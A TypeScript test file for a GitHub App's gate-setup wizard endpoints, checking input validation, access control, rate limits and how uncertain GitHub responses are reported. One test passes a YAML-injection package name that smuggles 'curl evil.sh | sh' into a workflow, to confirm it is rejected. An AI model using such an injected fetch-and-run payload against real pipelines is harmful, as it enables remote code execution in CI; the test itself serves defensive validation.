import { env } from "cloudflare:test";
import { afterEach, describe, expect, test, vi } from "vitest";
import { createDb } from "../../server/db/client";
import { addOrganizationMember } from "../../server/db/invitations";
import { upsertInstallation } from "../../server/lib/github-app/persistence";
import { githubAppRoutes } from "../../server/routes/github-app";
import type { Bindings } from "../../server/types";
import { buildTestApp, call as callRoute, type TestApp } from "./helpers/app";
import { seedUser } from "./helpers/seed";
import { exhaustedRateLimitBindings } from "./rate-limit-doubles";

/**
 * Routes for the guided gate-setup wizard.
 *
 * Both endpoints are read-only: Drydock holds no write permission on a gated
 * repository, so the wizard sends the maintainer to GitHub and verifies the
 * result. The interesting surface is what `verify` reports when a read is
 * refused or ambiguous — it must degrade to `unknown`, never to a confident
 * answer the wizard would render as a green gate.
 */

const APP_ID = "12345";
const originalFetch = globalThis.fetch;
const mountGithubApp = (app: TestApp) => app.route("/api/v1/github-app", githubAppRoutes);

let testPrivateKeyPem: string | null = null;
async function getTestPrivateKeyPem(): Promise<string> {
  if (testPrivateKeyPem) return testPrivateKeyPem;
  const keyPair = (await crypto.subtle.generateKey(
    {
      name: "RSASSA-PKCS1-v1_5",
      modulusLength: 2048,
      publicExponent: new Uint8Array([1, 0, 1]),
      hash: "SHA-256",
    },
    true,
    ["sign", "verify"],
  )) as CryptoKeyPair;
  const pkcs8 = await crypto.subtle.exportKey("pkcs8", keyPair.privateKey);
  let binary = "";
  for (const byte of new Uint8Array(pkcs8)) binary += String.fromCharCode(byte);
  const base64 = btoa(binary);
  const lines = base64.match(/.{1,64}/g)?.join("\n") ?? base64;
  testPrivateKeyPem = `-----BEGIN PRIVATE KEY-----\n${lines}\n-----END PRIVATE KEY-----`;
  return testPrivateKeyPem;
}

function seedInstallation(organizationId: string) {
  return upsertInstallation(createDb(env.DB), {
    organizationId,
    installationId: `${Math.floor(Math.random() * 1e9)}`,
    accountLogin: "octo",
    accountType: "Organization",
    targetType: "Organization",
    status: "active",
    createdByUserId: null,
  });
}

function appFor(userId: string): TestApp {
  return buildTestApp(mountGithubApp, { userId });
}

async function call(
  app: TestApp,
  path: string,
  body: unknown,
  envOverrides: Partial<Bindings> = {},
  activeOrganizationId?: string,
) {
  return callRoute(app, "POST", path, {
    body,
    activeOrganizationId,
    envOverride: {
      GITHUB_APP_ID: APP_ID,
      GITHUB_APP_SLUG: "drydock-test",
      GITHUB_APP_CLIENT_ID: "client-id",
      GITHUB_APP_CLIENT_SECRET: "client-secret",
      GITHUB_APP_PRIVATE_KEY: await getTestPrivateKeyPem(),
      GITHUB_APP_WEBHOOK_SECRET: "webhook-secret-value-1234567890",
      GITHUB_APP_STATE_SECRET: "0123456789abcdef0123456789abcdef",
      BETTER_AUTH_SECRET: "fallback-secret-with-enough-entropy-aaaaaaaa",
      ...envOverrides,
    },
  });
}

/** Every gate-setup call starts by minting an installation token. */
function githubDouble(
  handler: (request: Request) => Promise<Response> | Response,
  mint: () => Response = () =>
    Response.json({ token: "ghs_install_token", expires_at: "2099-01-01T00:00:00Z" }),
): typeof globalThis.fetch {
  return vi.fn(async (input: RequestInfo | URL, init?: RequestInit) => {
    const request = input instanceof Request ? input : new Request(input, init);
    if (request.url.includes("/access_tokens")) return mint();
    return handler(request);
  }) as unknown as typeof globalThis.fetch;
}

/** An environment Drydock gates, with GitHub's admin-bypass checkbox as given. */
function armedGithub(environmentBody: Record<string, unknown>) {
  return githubDouble((request) => {
    if (request.url.includes("/deployment_protection_rules")) {
      return Response.json({
        custom_deployment_protection_rules: [{ app: { id: 12345 }, enabled: true }],
      });
    }
    if (request.url.includes("/environments/")) return Response.json(environmentBody);
    return Response.json({ default_branch: "main" });
  });
}

function draft(installationRowId: string, overrides: Record<string, unknown> = {}) {
  return {
    installationRowId,
    repositoryFullName: "octo/widgets",
    environment: "Production",
    ecosystem: "npm",
    packageName: "@acme/widgets",
    ...overrides,
  };
}

afterEach(() => {
  globalThis.fetch = originalFetch;
});

describe("gate-setup validation and ownership", () => {
  test("rejects a draft with no repository", async () => {
    const { userId, organizationId } = await seedUser();
    const installation = await seedInstallation(organizationId);
    globalThis.fetch = vi.fn();

    const res = await call(
      appFor(userId),
      "/api/v1/github-app/gate-setup/verify",
      draft(installation.id, { repositoryFullName: "" }),
    );

    expect(res.status).toBe(400);
    expect(await res.json()).toMatchObject({ error: "repositoryFullName is required" });
    expect(globalThis.fetch).not.toHaveBeenCalled();
  });

  test("rejects a repository that is not owner/repo", async () => {
    const { userId, organizationId } = await seedUser();
    const installation = await seedInstallation(organizationId);
    globalThis.fetch = vi.fn();

    const res = await call(
      appFor(userId),
      "/api/v1/github-app/gate-setup/verify",
      draft(installation.id, { repositoryFullName: "octo/widgets/extra" }),
    );

    expect(res.status).toBe(400);
    expect(globalThis.fetch).not.toHaveBeenCalled();
  });

  test("verifies an environment name the workflow template would refuse", async () => {
    const { userId, organizationId } = await seedUser();
    const installation = await seedInstallation(organizationId);
    // A slash is outside the template allowlist but perfectly legal on GitHub,
    // and an environment created by hand has to stay checkable.
    globalThis.fetch = githubDouble((request) =>
      request.url.includes("/deployment_protection_rules")
        ? Response.json({
            custom_deployment_protection_rules: [{ app: { id: 12345 }, enabled: true }],
          })
        : Response.json({ name: "production/eu", default_branch: "main" }),
    );

    const res = await call(
      appFor(userId),
      "/api/v1/github-app/gate-setup/verify",
      draft(installation.id, { environment: "production/eu" }),
    );

    expect(res.status).toBe(200);
    expect(await res.json()).toMatchObject({
      state: { environment: "present", protectionRule: "present" },
    });
  });

  test("does not report a disabled protection rule as armed", async () => {
    const { userId, organizationId } = await seedUser();
    const installation = await seedInstallation(organizationId);
    // GitHub returns the rule with `enabled: false` when a maintainer switches
    // it off. The row still names Drydock, but it holds no deployment.
    globalThis.fetch = githubDouble((request) =>
      request.url.includes("/deployment_protection_rules")
        ? Response.json({
            custom_deployment_protection_rules: [{ app: { id: 12345 }, enabled: false }],
          })
        : Response.json({ name: "production", default_branch: "main" }),
    );

    const res = await call(
      appFor(userId),
      "/api/v1/github-app/gate-setup/verify",
      draft(installation.id),
    );

    expect(res.status).toBe(200);
    expect(await res.json()).toMatchObject({
      state: { environment: "present", protectionRule: "absent" },
    });
  });

  test("does not call an environment 404 absent when the repository is unreadable", async () => {
    const { userId, organizationId } = await seedUser();
    const installation = await seedInstallation(organizationId);
    // A repository renamed, transferred, or with App access revoked answers 404
    // on both reads. That is not evidence the environment is missing.
    globalThis.fetch = githubDouble(() => new Response("", { status: 404 }));

    const res = await call(
      appFor(userId),
      "/api/v1/github-app/gate-setup/verify",
      draft(installation.id),
    );

    expect(res.status).toBe(200);
    const body = (await res.json()) as {
      state: { environment: string; protectionRule: string; unavailableReason?: string };
    };
    expect(body.state.environment).toBe("unknown");
    expect(body.state.protectionRule).toBe("unknown");
    expect(body.state.unavailableReason).toContain("cannot see this repository");
  });

  test("keeps an environment 404 absent when the repository itself reads fine", async () => {
    const { userId, organizationId } = await seedUser();
    const installation = await seedInstallation(organizationId);
    globalThis.fetch = githubDouble((request) =>
      request.url.includes("/environments/")
        ? new Response("", { status: 404 })
        : Response.json({ name: "octo/widgets", default_branch: "main" }),
    );

    const res = await call(
      appFor(userId),
      "/api/v1/github-app/gate-setup/verify",
      draft(installation.id),
    );

    expect(res.status).toBe(200);
    expect(await res.json()).toMatchObject({
      state: { environment: "absent", protectionRule: "absent" },
    });
  });

  test("does not report an unreadable rules body as no rule", async () => {
    const { userId, organizationId } = await seedUser();
    const installation = await seedInstallation(organizationId);
    // A 200 carrying a truncated or non-JSON body is a read that did not
    // complete; folding it into an empty list would report a live gate as gone.
    globalThis.fetch = githubDouble((request) =>
      request.url.includes("/deployment_protection_rules")
        ? new Response("<html>proxy</html>", { status: 200 })
        : Response.json({ name: "production", default_branch: "main" }),
    );

    const res = await call(
      appFor(userId),
      "/api/v1/github-app/gate-setup/verify",
      draft(installation.id),
    );

    expect(res.status).toBe(200);
    expect(await res.json()).toMatchObject({
      state: { environment: "present", protectionRule: "unknown" },
    });
  });

  test("400s that same environment name on the preview, which interpolates it", async () => {
    const { userId, organizationId } = await seedUser();
    const installation = await seedInstallation(organizationId);
    globalThis.fetch = vi.fn();

    const res = await call(
      appFor(userId),
      "/api/v1/github-app/gate-setup/preview",
      draft(installation.id, { environment: "e".repeat(129) }),
    );

    expect(res.status).toBe(400);
    expect(await res.json()).toMatchObject({ code: "invalid_input" });
    expect(globalThis.fetch).not.toHaveBeenCalled();
  });

  test("404s an installation another organization owns", async () => {
    const caller = await seedUser();
    const other = await seedUser();
    const installation = await seedInstallation(other.organizationId);
    globalThis.fetch = vi.fn();

    const res = await call(
      appFor(caller.userId),
      "/api/v1/github-app/gate-setup/verify",
      draft(installation.id),
    );

    expect(res.status).toBe(404);
    expect(await res.json()).toMatchObject({ code: "installation_missing" });
    expect(globalThis.fetch).not.toHaveBeenCalled();
  });

  test.each(["verify", "preview"])(
    "403s an organization member on %s without calling GitHub",
    async (endpoint) => {
      const owner = await seedUser();
      const member = await seedUser();
      await addOrganizationMember(createDb(env.DB), {
        organizationId: owner.organizationId,
        userId: member.userId,
        role: "member",
      });
      const installation = await seedInstallation(owner.organizationId);
      globalThis.fetch = vi.fn();

      const res = await call(
        appFor(member.userId),
        `/api/v1/github-app/gate-setup/${endpoint}`,
        draft(installation.id),
        {},
        owner.organizationId,
      );

      // Guided setup is an integrations surface: members see an explanation in
      // the UI, and the API refuses them before touching the installation.
      expect(res.status).toBe(403);
      expect(globalThis.fetch).not.toHaveBeenCalled();
    },
  );

  test("503s when the GitHub App is not configured on the Worker", async () => {
    const { userId, organizationId } = await seedUser();
    const installation = await seedInstallation(organizationId);
    globalThis.fetch = vi.fn();

    const res = await call(
      appFor(userId),
      "/api/v1/github-app/gate-setup/verify",
      draft(installation.id),
      { GITHUB_APP_ID: undefined },
    );

    expect(res.status).toBe(503);
    expect(await res.json()).toMatchObject({ code: "github_app_not_configured" });
    expect(globalThis.fetch).not.toHaveBeenCalled();
  });

  test("429s and never calls GitHub when the org is over its setup budget", async () => {
    const { userId, organizationId } = await seedUser();
    const installation = await seedInstallation(organizationId);
    const { overrides } = exhaustedRateLimitBindings();
    globalThis.fetch = vi.fn();

    const res = await call(
      appFor(userId),
      "/api/v1/github-app/gate-setup/verify",
      draft(installation.id),
      overrides as Partial<Bindings>,
    );

    expect(res.status).toBe(429);
    expect(globalThis.fetch).not.toHaveBeenCalled();
  });
});

describe("gate-setup preview", () => {
  test("returns the ecosystem's workflow with the draft interpolated", async () => {
    const { userId, organizationId } = await seedUser();
    const installation = await seedInstallation(organizationId);
    globalThis.fetch = vi.fn();

    const res = await call(
      appFor(userId),
      "/api/v1/github-app/gate-setup/preview",
      draft(installation.id),
    );

    expect(res.status).toBe(200);
    const body = (await res.json()) as { workflowPath: string; yaml: string; notes: string[] };
    expect(body.workflowPath).toBe(".github/workflows/drydock-npm-release.yml");
    // The workflow names the environment exactly as GitHub has it: a trusted
    // publisher is configured against that same string.
    expect(body.yaml).toContain('environment: "Production"');
    expect(body.yaml).toContain('name: "Publish @acme/widgets"');
    expect(body.notes.length).toBeGreaterThan(0);
    // Pure computation: the preview must not spend the installation's GitHub budget.
    expect(globalThis.fetch).not.toHaveBeenCalled();
  });

  test("400s an ecosystem with no gate setup template", async () => {
    const { userId, organizationId } = await seedUser();
    const installation = await seedInstallation(organizationId);
    globalThis.fetch = vi.fn();

    const res = await call(
      appFor(userId),
      "/api/v1/github-app/gate-setup/preview",
      draft(installation.id, { ecosystem: "atpm" }),
    );

    expect(res.status).toBe(400);
    expect(await res.json()).toMatchObject({ code: "unsupported_ecosystem" });
  });

  test("400s a package name that could break out of the YAML scalar", async () => {
    const { userId, organizationId } = await seedUser();
    const installation = await seedInstallation(organizationId);
    globalThis.fetch = vi.fn();

    const res = await call(
      appFor(userId),
      "/api/v1/github-app/gate-setup/preview",
      draft(installation.id, { packageName: 'x"\n      - run: curl evil.sh | sh' }),
    );

    expect(res.status).toBe(400);
    expect(await res.json()).toMatchObject({ code: "invalid_input" });
  });
});

describe("gate-setup verify", () => {
  test("reports the gate armed when Drydock is the environment's protection rule", async () => {
    const { userId, organizationId } = await seedUser();
    const installation = await seedInstallation(organizationId);
    const seen: string[] = [];
    globalThis.fetch = githubDouble((request) => {
      seen.push(new URL(request.url).pathname);
      if (request.url.includes("/deployment_protection_rules")) {
        return Response.json({
          custom_deployment_protection_rules: [
            { app: { id: 999 }, enabled: true },
            { app: { id: 12345 }, enabled: true },
          ],
        });
      }
      if (request.url.includes("/environments/")) return Response.json({ name: "production" });
      return Response.json({ default_branch: "trunk" });
    });

    const res = await call(
      appFor(userId),
      "/api/v1/github-app/gate-setup/verify",
      draft(installation.id),
    );

    expect(res.status).toBe(200);
    expect(await res.json()).toEqual({
      state: {
        environment: "present",
        protectionRule: "present",
        // The environment body carried no `can_admins_bypass`.
        adminBypass: "unknown",
        defaultBranch: "trunk",
      },
    });
    // Every request is a read; a write would mean the App needs a permission
    // guided setup deliberately does not ask for.
    expect(seen.every((path) => path.startsWith("/repos/octo/widgets"))).toBe(true);
  });

  test("reports the rule absent when some other app gates the environment", async () => {
    const { userId, organizationId } = await seedUser();
    const installation = await seedInstallation(organizationId);
    globalThis.fetch = githubDouble((request) =>
      request.url.includes("/deployment_protection_rules")
        ? Response.json({
            custom_deployment_protection_rules: [{ app: { id: 999 }, enabled: true }],
          })
        : Response.json({ name: "production", default_branch: "main" }),
    );

    const res = await call(
      appFor(userId),
      "/api/v1/github-app/gate-setup/verify",
      draft(installation.id),
    );

    expect(await res.json()).toMatchObject({
      state: { environment: "present", protectionRule: "absent" },
    });
  });

  test("a missing environment settles both checks without reading its rules", async () => {
    const { userId, organizationId } = await seedUser();
    const installation = await seedInstallation(organizationId);
    const seen: string[] = [];
    globalThis.fetch = githubDouble((request) => {
      seen.push(request.url);
      if (request.url.includes("/environments/")) return new Response("", { status: 404 });
      return Response.json({ default_branch: "main" });
    });

    const res = await call(
      appFor(userId),
      "/api/v1/github-app/gate-setup/verify",
      draft(installation.id),
    );

    expect(await res.json()).toMatchObject({
      state: { environment: "absent", protectionRule: "absent" },
    });
    expect(seen.some((url) => url.includes("/deployment_protection_rules"))).toBe(false);
  });

  test("a refused rules read is unknown, never a confident answer", async () => {
    const { userId, organizationId } = await seedUser();
    const installation = await seedInstallation(organizationId);
    globalThis.fetch = githubDouble((request) =>
      request.url.includes("/deployment_protection_rules")
        ? new Response("", { status: 403 })
        : Response.json({ name: "production", default_branch: "main" }),
    );

    const res = await call(
      appFor(userId),
      "/api/v1/github-app/gate-setup/verify",
      draft(installation.id),
    );

    const body = (await res.json()) as { state: { protectionRule: string; environment: string } };
    expect(body.state.environment).toBe("present");
    expect(body.state.protectionRule).toBe("unknown");
  });

  test("a transport failure is unknown and leaks no GitHub detail", async () => {
    const { userId, organizationId } = await seedUser();
    const installation = await seedInstallation(organizationId);
    globalThis.fetch = githubDouble(() => {
      throw new Error("connect ECONNREFUSED 140.82.121.5:443");
    });

    const res = await call(
      appFor(userId),
      "/api/v1/github-app/gate-setup/verify",
      draft(installation.id),
    );

    expect(res.status).toBe(200);
    const body = (await res.json()) as { state: { unavailableReason?: string } };
    expect(body).toMatchObject({ state: { environment: "unknown", protectionRule: "unknown" } });
    expect(body.state.unavailableReason).not.toContain("ECONNREFUSED");
  });

  test("verifies the environment under the exact name GitHub reports", async () => {
    const { userId, organizationId } = await seedUser();
    const installation = await seedInstallation(organizationId);
    const seen: string[] = [];
    globalThis.fetch = githubDouble((request) => {
      seen.push(request.url);
      if (request.url.includes("/deployment_protection_rules")) {
        return Response.json({ custom_deployment_protection_rules: [] });
      }
      return Response.json({ name: "production", default_branch: "main" });
    });

    await call(
      appFor(userId),
      "/api/v1/github-app/gate-setup/verify",
      draft(installation.id, { environment: "Production" }),
    );

    // Folding case here would 404 an environment that exists and report the
    // gate as missing.
    expect(seen.some((url) => url.endsWith("/environments/Production"))).toBe(true);
  });

  test("a verify draft needs no ecosystem or package name", async () => {
    const { userId, organizationId } = await seedUser();
    const installation = await seedInstallation(organizationId);
    globalThis.fetch = githubDouble((request) =>
      request.url.includes("/deployment_protection_rules")
        ? Response.json({ custom_deployment_protection_rules: [] })
        : Response.json({ name: "production", default_branch: "main" }),
    );

    const res = await call(
      appFor(userId),
      "/api/v1/github-app/gate-setup/verify",
      draft(installation.id, { ecosystem: "", packageName: "" }),
    );

    expect(res.status).toBe(200);
  });

  test.each([
    [true, "allowed"],
    [false, "blocked"],
    ["yes", "unknown"],
  ])("reports admin bypass from can_admins_bypass=%s as %s", async (value, expected) => {
    const { userId, organizationId } = await seedUser();
    const installation = await seedInstallation(organizationId);
    globalThis.fetch = armedGithub({ name: "Production", can_admins_bypass: value });

    const res = await call(
      appFor(userId),
      "/api/v1/github-app/gate-setup/verify",
      draft(installation.id),
    );

    // Admin bypass is reported beside the gate, not folded into it: the rule
    // still holds every run nobody overrides.
    expect(await res.json()).toMatchObject({
      state: { environment: "present", protectionRule: "present", adminBypass: expected },
    });
  });

  test("keeps the admin-bypass answer when the rules read fails", async () => {
    const { userId, organizationId } = await seedUser();
    const installation = await seedInstallation(organizationId);
    globalThis.fetch = githubDouble((request) => {
      if (request.url.includes("/deployment_protection_rules")) {
        return new Response("", { status: 502 });
      }
      if (request.url.includes("/environments/")) {
        return Response.json({ name: "Production", can_admins_bypass: true });
      }
      return Response.json({ default_branch: "main" });
    });

    const res = await call(
      appFor(userId),
      "/api/v1/github-app/gate-setup/verify",
      draft(installation.id),
    );

    expect(await res.json()).toMatchObject({
      state: { environment: "present", protectionRule: "unknown", adminBypass: "allowed" },
    });
  });

  test("a transient token-mint failure is unknown, not an inactive installation", async () => {
    const { userId, organizationId } = await seedUser();
    const installation = await seedInstallation(organizationId);
    globalThis.fetch = githubDouble(
      () => Response.json({}),
      () => new Response("upstream exploded: request id 1f2e", { status: 503 }),
    );

    const res = await call(
      appFor(userId),
      "/api/v1/github-app/gate-setup/verify",
      draft(installation.id),
    );

    expect(res.status).toBe(200);
    const text = await res.text();
    expect(JSON.parse(text)).toMatchObject({
      state: { environment: "unknown", protectionRule: "unknown", adminBypass: "unknown" },
    });
    expect(text).not.toContain("upstream exploded");
  });

  test("a rate-limited token mint is unknown even when GitHub answers 403", async () => {
    const { userId, organizationId } = await seedUser();
    const installation = await seedInstallation(organizationId);
    // GitHub reports a secondary rate limit as a 403 with retry-after; that is
    // a mint that did not complete, not a suspended installation.
    globalThis.fetch = githubDouble(
      () => Response.json({}),
      () =>
        new Response('{"message":"You have exceeded a secondary rate limit"}', {
          status: 403,
          headers: { "retry-after": "0" },
        }),
    );

    const res = await call(
      appFor(userId),
      "/api/v1/github-app/gate-setup/verify",
      draft(installation.id),
    );

    expect(res.status).toBe(200);
    expect(await res.json()).toMatchObject({ state: { protectionRule: "unknown" } });
  });

  test.each([403, 404])(
    "a token mint refused with %s is an inactive installation, without GitHub's body",
    async (status) => {
      const { userId, organizationId } = await seedUser();
      const installation = await seedInstallation(organizationId);
      globalThis.fetch = githubDouble(
        () => Response.json({}),
        () =>
          new Response('{"message":"This installation has been suspended","secret":"s3cr3t"}', {
            status,
          }),
      );

      const res = await call(
        appFor(userId),
        "/api/v1/github-app/gate-setup/verify",
        draft(installation.id),
      );

      expect(res.status).toBe(409);
      const text = await res.text();
      expect(JSON.parse(text)).toMatchObject({ code: "installation_inactive" });
      expect(text).not.toContain("has been suspended");
      expect(text).not.toContain("s3cr3t");
    },
  );
});
